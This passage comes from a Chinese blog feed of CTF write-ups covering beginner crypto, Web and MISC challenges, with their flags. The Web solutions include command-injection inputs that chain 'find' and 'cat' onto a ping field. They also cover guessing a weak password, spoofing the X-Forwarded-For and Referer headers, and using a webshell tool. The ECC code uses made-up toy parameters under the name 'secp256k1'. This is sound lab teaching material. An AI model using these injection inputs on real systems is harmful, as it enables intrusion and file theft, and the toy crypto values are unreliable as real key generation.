curve.p,</span><br><span class="line">              -y3 % curve.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scalar_mult</span>(<span class="params">k, point</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns k * point computed using the double and point_add algorithm.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> is_on_curve(point)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># k * point = -k * (-point)</span></span><br><span class="line">        <span class="keyword">return</span> scalar_mult(-k, point_neg(point))</span><br><span class="line"></span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    addend = point</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> k:</span><br><span class="line">        <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># Add.</span></span><br><span class="line">            result = point_add(result, addend)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Double.</span></span><br><span class="line">        addend = point_add(addend, addend)</span><br><span class="line"></span><br><span class="line">        k &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Keypair generation and ECDHE ################################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_keypair</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generates a random private-public key pair.&quot;&quot;&quot;</span></span><br><span class="line">    private_key = curve.n</span><br><span class="line">    public_key = scalar_mult(private_key, curve.g)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> private_key, public_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EllipticCurve = collections.namedtuple(<span class="string">&#x27;EllipticCurve&#x27;</span>, <span class="string">&#x27;name p a b g n h&#x27;</span>)</span><br><span class="line">curve = EllipticCurve(</span><br><span class="line">    <span class="string">&#x27;secp256k1&#x27;</span>,</span><br><span class="line">    <span class="comment"># Field characteristic.</span></span><br><span class="line">    p=<span class="number">15424654874903</span>,</span><br><span class="line">    <span class="comment"># Curve coefficients.</span></span><br><span class="line">    a=<span class="number">16546484</span>,</span><br><span class="line">    b=<span class="number">4548674875</span>,</span><br><span class="line">    <span class="comment"># Base point.</span></span><br><span class="line">    g=(<span class="number">6478678675</span>, <span class="number">5636379357093</span>),</span><br><span class="line">    <span class="comment"># Subgroup order.</span></span><br><span class="line">    n=<span class="number">546768</span>,</span><br><span class="line">    <span class="comment"># Subgroup cofactor.</span></span><br><span class="line">    h=<span class="number">1</span>,</span><br><span class="line">)</span><br><span class="line">private_key, public_key = make_keypair()</span><br><span class="line">print(<span class="string">&quot;private key:&quot;</span>, <span class="built_in">hex</span>(private_key))</span><br><span class="line">print(<span class="string">&quot;public key: (0x&#123;:x&#125;, 0x&#123;:x&#125;)&quot;</span>.<span class="built_in">format</span>(*public_key))</span><br><span class="line">print(<span class="string">&quot;x + y = &quot;</span> + <span class="built_in">str</span>(public_key[<span class="number">0</span>] + public_key[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>  结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private key: 0x857d0</span><br><span class="line">public key: (0xcb19fe553fa, 0x50545408eb4)</span><br><span class="line">x + y &#x3D; 19477226185390</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;base64&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#base64&quot;&gt;&lt;/a&gt; base64&lt;/h1&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#题目&quot;&gt;&lt;/a&gt; 题目&lt;/h2</summary>
      
    
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/tags/CTF/"/>
    
    <category term="CRYPTO" scheme="https://coder.lufer.cc/tags/CRYPTO/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Web新手练习题</title>
    <link href="https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <id>https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E9%A2%98/</id>
    <published>2021-08-10T16:17:19.000Z</published>
    <updated>2021-12-17T03:59:35.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="view_source"><a class="markdownIt-Anchor" href="#view_source"></a> view_source</h1><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p>  难度系数：1.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p><h2 id="解答"><a class="markdownIt-Anchor" href="#解答"></a> 解答</h2><p>  F12得到答案：<code>cyberpeace&#123;0d141ae981465634833f8446a771e484&#125;</code>。</p><h1 id="robots"><a class="markdownIt-Anchor" href="#robots"></a> robots</h1><h2 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p><h2 id="解答-2"><a class="markdownIt-Anchor" href="#解答-2"></a> 解答</h2><p>  根据题目所说robots协议，访问场景下的<code>/robots.txt</code>文件，得到如下内容：</p><blockquote><p>User-agent: *<br />Disallow:<br />Disallow: f1ag_1s_h3re.php</p></blockquote><p>  再访问<code>/f1ag_1s_h3re.php</code>。得到答案:<code>cyberpeace&#123;b18c54f0bf9f4a64c0aecff3248d6650&#125;</code>。</p><h1 id="backup"><a class="markdownIt-Anchor" href="#backup"></a> backup</h1><h2 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p><h2 id="解答-3"><a class="markdownIt-Anchor" href="#解答-3"></a> 解答</h2><p>  根据页面描述：<code>你知道index.php的备份文件名吗？</code>，尝试访问<code>index.php.bak</code>，下载后打开得到答案：<code>Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</code>。</p><h1 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> cookie</h1><h2 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p><h2 id="解答-4"><a class="markdownIt-Anchor" href="#解答-4"></a> 解答</h2><p>  根据题目描述，F12查看网络请求的cookie，得到<code>look-here=cookie.php</code>。<br />  访问cookie.php，得到提示<code>See the http response</code>，根据提示查看response，在响应头中可以找到答案：<code>flag: cyberpeace&#123;f9bb6af749eaf0a1877956e6c8944722&#125;</code>。</p><h1 id="disabled_button"><a class="markdownIt-Anchor" href="#disabled_button"></a> disabled_button</h1><h2 id="题目-5"><a class="markdownIt-Anchor" href="#题目-5"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p><h2 id="解答-5"><a class="markdownIt-Anchor" href="#解答-5"></a> 解答</h2><p>  把button的disabled属性去掉，点击后得到答案：<code>cyberpeace&#123;aa004bdc9907bdf379f228c385542b7a&#125;</code>。</p><h1 id="weak_auth"><a class="markdownIt-Anchor" href="#weak_auth"></a> weak_auth</h1><h2 id="题目-6"><a class="markdownIt-Anchor" href="#题目-6"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。</p><h2 id="解答-6"><a class="markdownIt-Anchor" href="#解答-6"></a> 解答</h2><p>  根据题目描述应该是弱密码，尝试使用admin，admin登录失败，尝试使用admin，123456登录得到答案：<code>cyberpeace&#123;e0d6f8c6f59c0934769eda6ad719b2db&#125;</code>。</p><h1 id="simple_php"><a class="markdownIt-Anchor" href="#simple_php"></a> simple_php</h1><h2 id="题目-7"><a class="markdownIt-Anchor" href="#题目-7"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p><h2 id="解答-7"><a class="markdownIt-Anchor" href="#解答-7"></a> 解答</h2><p>  网址访问后有如下代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  根据代码逻辑，通过get方式传递a和b两个参数，其中a要为0，但不能为数字0，否则过不去and条件，所以设置为任意字母即可，b要大于1234但不能是纯数字，所以后面加一个字母。</p><p>  访问<code>/?a=a&amp;b=1235c</code>即可得到答案：<code>Cyberpeace&#123;647E37C7627CC3E4019EC69324F66C7C&#125;</code>。</p><h1 id="get_post"><a class="markdownIt-Anchor" href="#get_post"></a> get_post</h1><h2 id="题目-8"><a class="markdownIt-Anchor" href="#题目-8"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p><h2 id="解答-8"><a class="markdownIt-Anchor" href="#解答-8"></a> 解答</h2><p>  访问页面获得提示<code>请用GET方式提交一个名为a,值为1的变量</code>。<br />  访问<code>/?a=1</code>得到提示:<code>请用GET方式提交一个名为a,值为1的变量，请再以POST方式随便提交一个名为b,值为2的变量</code>。</p><p>  打开Postman，给链接<code>/?a=1</code>发送一个POST请求，body中b的值为2。</p><p><img src="https://pic.lufer.cc/images/2021/08/11/image5956081436e977b6.png" alt="" /></p><p>  得到答案:<code>cyberpeace&#123;7213df1a0d7ff4813ff1784115d7285c&#125;</code>。</p><h1 id="xff_referer"><a class="markdownIt-Anchor" href="#xff_referer"></a> xff_referer</h1><h2 id="题目-9"><a class="markdownIt-Anchor" href="#题目-9"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：X老师告诉小宁其实xff和referer是可以伪造的。</p><h2 id="解答-9"><a class="markdownIt-Anchor" href="#解答-9"></a> 解答</h2><p>  访问网址，提示为<code>ip地址必须为123.123.123.123</code>。<br />  用Postman访问链接，头部添加<code>X-Forwarded-For</code>，值为给定的IP地址，得到新的提示：<code>必须来自https://www.google.com</code>。</p><p><img src="https://pic.lufer.cc/images/2021/08/11/image9afae6b20532fe58.png" alt="" /></p><p>  于是再添加referer，值为<code>https://www.google.com</code>。</p><p><img src="https://pic.lufer.cc/images/2021/08/11/imagee8256c6ae34c615a.png" alt="" /></p><p>  得到答案：<code>cyberpeace&#123;5b7a2438c6df8a7fb89edb484b2fea4d&#125;</code>。</p><h1 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> webshell</h1><h2 id="题目-10"><a class="markdownIt-Anchor" href="#题目-10"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p><h2 id="解答-10"><a class="markdownIt-Anchor" href="#解答-10"></a> 解答</h2><p>  根据提示可以知道是WebShell攻击，用中国菜刀添加网址，得到flag.txt。打开获得答案：<code>cyberpeace&#123;41e76883815baf71fba1a2e29d3e65b9&#125;</code>。</p><h1 id="command_execution"><a class="markdownIt-Anchor" href="#command_execution"></a> command_execution</h1><h2 id="题目-11"><a class="markdownIt-Anchor" href="#题目-11"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： Cyberpeace-n3k0<br />  题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p><h2 id="解答-11"><a class="markdownIt-Anchor" href="#解答-11"></a> 解答</h2><p>  网站只有一个ping输入框，考虑可以用ping并带其他命令的方式来执行，执行<code>127.0.0.1|find / -name &quot;flag.*&quot;</code>搜索服务器本地的flag文件。</p><blockquote><p>ping -c 3 127.0.0.1|find / -name “flag.*”<br />/home/flag.txt</p></blockquote><p>  然后访问这个文件，<code>127.0.0.1|cat /home/flag.txt</code>，得到答案：<code>cyberpeace&#123;c72bd8829fd9cab078eff060ffc63713&#125;</code>。</p><h1 id="simple_js"><a class="markdownIt-Anchor" href="#simple_js"></a> simple_js</h1><h2 id="题目-12"><a class="markdownIt-Anchor" href="#题目-12"></a> 题目</h2><p>  难度系数： 3.0<br />  题目来源： root-me<br />  题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )</p><h2 id="解答-12"><a class="markdownIt-Anchor" href="#解答-12"></a> 解答</h2><p>  访问之后发现需要输入密码，根据题目描述考虑可能是有js脚本，F12查看网页源码，发现如下代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;JS&lt;/title&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span>(<span class="params">pass_enc</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> tab  = pass_enc.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> tab2 = pass.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        j = tab.length;</span><br><span class="line">        k = j + (l) + (n=<span class="number">0</span>);</span><br><span class="line">        n = tab2.length;</span><br><span class="line">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span><br><span class="line">            o = tab[i-l];p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span><br><span class="line">            o = tab[i-l];</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span><br><span class="line">                p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        p += <span class="built_in">String</span>.fromCharCode(tab2[<span class="number">17</span>]);</span><br><span class="line">        pass = p;<span class="keyword">return</span> pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](dechiffre(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span><br><span class="line"></span><br><span class="line">    h = <span class="built_in">window</span>.prompt(<span class="string">&#x27;Enter password&#x27;</span>);</span><br><span class="line">    alert( dechiffre(h) );</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  将后面的<code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code>进行16进制到字符的转换，可以得到：<code>55,56,54,79,115,69,114,116,107,49,50</code>。<br />  转换为对应的ASCII码得到<code>786OsErtk12</code>，故答案为<code>Cyberpeace&#123;786OsErtk12&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;view_source&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#view_source&quot;&gt;&lt;/a&gt; view_source&lt;/h1&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#</summary>
      
    
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/tags/CTF/"/>
    
    <category term="Web" scheme="https://coder.lufer.cc/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界MISC新手练习题</title>
    <link href="https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <id>https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E9%A2%98/</id>
    <published>2021-08-10T01:22:20.000Z</published>
    <updated>2021-12-17T03:59:35.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="this_is_flag"><a class="markdownIt-Anchor" href="#this_is_flag"></a> this_is_flag</h1><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： 暂无<br />  题目描述：Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}<br />  题目场景： 暂无<br />  题目附件： 暂无</p><h2 id="解答"><a class="markdownIt-Anchor" href="#解答"></a> 解答</h2><p>  样例题，直接复制题目中给出的<code>flag&#123;th1s_!s_a_d4m0_4la9&#125;</code>。</p><h1 id="pdf"><a class="markdownIt-Anchor" href="#pdf"></a> pdf</h1><h2 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h2><p>  难度系数： 3.0<br />  题目来源： csaw<br />  题目描述：菜猫给了菜狗一张图，说图下面什么都没有<br />  题目场景： 暂无</p><h2 id="解答-2"><a class="markdownIt-Anchor" href="#解答-2"></a> 解答</h2><p>  题目提示是图下面什么都没有，直接打开pdf并全选复制，可得到图下面的字符串<code>flag&#123;security_through_obscurity&#125;</code></p><h1 id="如来十三掌"><a class="markdownIt-Anchor" href="#如来十三掌"></a> 如来十三掌</h1><h2 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h2><p>  难度系数： 3.0<br />  题目来源： 暂无<br />  题目描述：菜狗为了打败菜猫，学了一套如来十三掌。<br />  题目场景： 暂无</p><h2 id="解答-3"><a class="markdownIt-Anchor" href="#解答-3"></a> 解答</h2><p>  题目附件是一个word，打开之后这段文字可以联想到佛语加密，在前面加上<code>佛曰：</code>，然后用佛曰解密。</p><p><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">https://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p>  可得到字符串：<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code>。</p><p>  联系题目提示“如来十三掌”，再用rot13解密，得到字符串：<code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code>。</p><p>  最后用Base64解码，得到flag：<code>flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</code>。</p><h1 id="give_you_flag"><a class="markdownIt-Anchor" href="#give_you_flag"></a> give_you_flag</h1><h2 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h2><p>  难度系数： 4.0<br />  题目来源： 暂无<br />  题目描述：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包<br />  题目场景： 暂无</p><h2 id="解答-4"><a class="markdownIt-Anchor" href="#解答-4"></a> 解答</h2><p>  观察题目附件给出的gif，可以看到闪过一个二维码，将其截取出来。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/image19c2bb7b4dddc35a.png" alt="" /></p><p>  这张图缺失了三个定位点，手动画一个之后扫描识别可以得到flag。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/imagefda1a35bd985ef02.png" alt="" /></p><p>  <code>flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</code></p><h1 id="stegano"><a class="markdownIt-Anchor" href="#stegano"></a> stegano</h1><h2 id="题目-5"><a class="markdownIt-Anchor" href="#题目-5"></a> 题目</h2><p>  难度系数： 4.0<br />  题目来源： CONFidence-DS-CTF-Teaser<br />  题目描述：菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}，解密字符需小写<br />  题目场景： 暂无</p><h2 id="解答-5"><a class="markdownIt-Anchor" href="#解答-5"></a> 解答</h2><p>  打开PDF，全选复制查看是否有隐藏内容，发现可得到如下字符串。</p><blockquote><p>NoFlagHere! NoFlagHere! NoFlagHere! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Close - but still not here !<br />BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</p></blockquote><p>  用_替换B，用.替换A，得到字符串：</p><blockquote><p>–…-- …-. .-… .- --. —… .---- -. …- .---- … .---- -… .-… …-- – …-- … … …- --. …–</p></blockquote><p>  解码字符串得到答案：<code>flag&#123;1nv151bl3m3554g3&#125;</code></p><h1 id="坚持60s"><a class="markdownIt-Anchor" href="#坚持60s"></a> 坚持60s</h1><h2 id="题目-6"><a class="markdownIt-Anchor" href="#题目-6"></a> 题目</h2><p>  难度系数： 4.0<br />  题目来源： 08067CTF<br />  题目描述：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡<br />  题目场景： 暂无</p><h2 id="解答-6"><a class="markdownIt-Anchor" href="#解答-6"></a> 解答</h2><p>  附件是一个jar包，考虑用反编译工具进行逆向。<br />  在Idea中打开jar包，定位到<code>cn.bjsxt\plane\PlaneGameFrame.class</code>,可以看到如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">this</span>.printInfo(g, <span class="string">&quot;加油你就是下一个老王&quot;</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">300</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="keyword">this</span>.printInfo(g, <span class="string">&quot;如果撑过一分钟我岂不是很没面子&quot;</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">300</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    <span class="keyword">this</span>.printInfo(g, <span class="string">&quot;flag&#123;RGFqaURhbGlfSmlud2FuQ2hpamk=&#125;&quot;</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">300</span>);</span><br></pre></td></tr></table></figure><p>  发现flag字符串结尾有个<code>=</code>，考虑是用base64加密过的，将<code>RGFqaURhbGlfSmlud2FuQ2hpamk=</code>解密后得到<code>DajiDali_JinwanChiji</code>，所以答案为<code>flag&#123;DajiDali_JinwanChiji&#125;</code>。</p><h1 id="gif"><a class="markdownIt-Anchor" href="#gif"></a> gif</h1><h2 id="题目-7"><a class="markdownIt-Anchor" href="#题目-7"></a> 题目</h2><p>  难度系数： 4.0<br />  题目来源： 暂无<br />  题目描述：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机<br />  题目场景： 暂无</p><h2 id="解答-7"><a class="markdownIt-Anchor" href="#解答-7"></a> 解答</h2><p>  打开附件发现是由黑白两种颜色的图构成，考虑是用二进制表示的ASCII码，共有104张图，而ASCII码的二进制为8位数，故将文件排列成13*8的矩阵排列，根据每一行八张图的黑白，用白色代表0，黑色代表1，得到二进制序列。</p><blockquote><p>01100110 01101100 01100001 01100111 01111011 01000110 01110101 01001110 01011111 01100111 01101001 01000110 01111101 01111101</p></blockquote><p>  转为ASCII码得到答案：<code>flag&#123;FuN_giF&#125;</code>。</p><h1 id="掀桌子"><a class="markdownIt-Anchor" href="#掀桌子"></a> 掀桌子</h1><p>  难度系数： 4.0<br />  题目来源： DDCTF2018<br />  题目描述：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻<br />  题目场景： 暂无<br />  题目附件： 暂无</p><h2 id="解答-8"><a class="markdownIt-Anchor" href="#解答-8"></a> 解答</h2><p>  题目没有附件，就只能从题干字符串得到答案，观察题干字符串可能是16进制数，将字符串两个字符一组，作为16进制数转换为10进制。</p><p>  将10进制数减去128后再转换为ASCII码，得到答案：<br /><code>flag&#123;hjzcydjzbjdcjkzkcugisdchjyjsbdfr&#125;</code></p><h1 id="ext3"><a class="markdownIt-Anchor" href="#ext3"></a> ext3</h1><h2 id="题目-8"><a class="markdownIt-Anchor" href="#题目-8"></a> 题目</h2><p>  难度系数： 5.0<br />  题目来源： bugku<br />  题目描述：今天是菜狗的生日，他收到了一个linux系统光盘<br />  题目场景： 暂无</p><h2 id="解答-9"><a class="markdownIt-Anchor" href="#解答-9"></a> 解答</h2><p>  先用Winhex打开附件，搜索flag，可以找到如下内容。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/imagef70387b3841742c8.png" alt="" /></p><p>  将后缀名改为zip之后解压，找到<code>O7avZhikgKgbF\flag.txt</code>，打开之后发现字符串为<code>ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</code>，用base64解码得到答案：<code>flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</code>。</p><h1 id="simplerar"><a class="markdownIt-Anchor" href="#simplerar"></a> SimpleRAR</h1><h2 id="题目-9"><a class="markdownIt-Anchor" href="#题目-9"></a> 题目</h2><p>  难度系数： 5.0<br />  题目来源： 08067CTF<br />  题目描述：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)<br />  题目场景： 暂无</p><h2 id="解答-10"><a class="markdownIt-Anchor" href="#解答-10"></a> 解答</h2><p>  用Winhex打开文件，发现flag.txt后藏了一个secret.png。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/imaged1d57f8656659cf0.png" alt="" /></p><blockquote><p>HEAD_TYPE=0x72 标记块<br />HEAD_TYPE=0x73 压缩文件头<br />HEAD_TYPE=0x74 文件头<br />HEAD_TYPE=0x75 注释头<br />HEAD_TYPE=0x76 旧风格的用户身份信息<br />HEAD_TYPE=0x77 子块<br />HEAD_TYPE=0x78 恢复纪录<br />HEAD_TYPE=0x79 用户身份信息<br />HEAD_TYPE=0x7a subblock</p></blockquote><p>  根据rar文件格式，将标记处的7A改为文件头的标志74，保存后解压文件，得到secret.png。</p><p>  而secret.png是一个纯白图片，继续用Winhex打开，发现其文件头为<code>GIF89a</code>，考虑这是一个gif文件。</p><p>  根据题目提示双图层，用PS打开，每个图层分别保存为gif文件。</p><p>  用StegSolve打开每个gif，可以得到两个拼接的图片。</p><p>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD<br /><a href="https://pic.lufer.cc/image/cNmT"><img src="https://pic.lufer.cc/images/2021/08/11/image.th.png" alt="image.th.png" /></a></p><p><a href="https://pic.lufer.cc/image/cRYr"><img src="https://pic.lufer.cc/images/2021/08/11/imagefb6a4a597307f904.th.png" alt="imagefb6a4a597307f904.th.png" /></a></p><p>  